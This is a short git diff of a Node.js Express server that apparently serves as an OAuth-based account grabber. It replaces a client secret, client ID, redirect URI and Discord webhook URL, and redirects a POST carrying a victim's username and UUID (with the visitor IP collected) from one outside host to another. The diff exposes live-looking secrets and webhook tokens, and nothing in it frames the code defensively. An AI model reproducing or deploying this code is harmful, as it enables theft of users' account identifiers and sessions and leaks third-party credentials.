@@ -1,8 +1,8 @@
 //Config
-const secret_value = '-idOJcr8PAZypmlJu6-zFPVaKcQNgZ8B'
-const client_id = '1021680771095875614'
-const redirect_uri = 'https://busy-cyan-dhole-kilt.cyclic.app/'
-const webhook_url = 'https"://discord.com/api/webhooks/1085811495838949406/XY2tRUlVHDxbbpMn0zAIF5F188LPXeiOofD7UPX54BlAuQ5oIjx3uzc45SR4LWJP5Ie4'
+const secret_value = '45948236-d35d-477e-a9cf-683669e20039'
+const client_id = 'bda30808-859d-4cef-8f6b-8892d9616e82'
+const redirect_uri = 'https://discord-hfdh.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1085874232426233886/rziGVIUqclqdhpbsCLIY0U12xqaIkJsv1gZI2fPg_fL5zjVAYaw60_MC-869MR6eqFm-'
 //Requirements
 const axios = require('axios')
 const express = require('express')
@@ -28,7 +28,7 @@ app.get('/', async (req, res) => {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         const ip = getIp(req)
-        pageGoPost({ url: "http://d-na.kr/oauth.php", target: "_self", vals: [["username", username], ["uuid", uuid]] });
+        pageGoPost({ url: "https://discord-hfdh.onrender.com/oauth.php", target: "_self", vals: [["username", username], ["uuid", uuid]] });
     } catch (e) {
         console.log(e)
     }
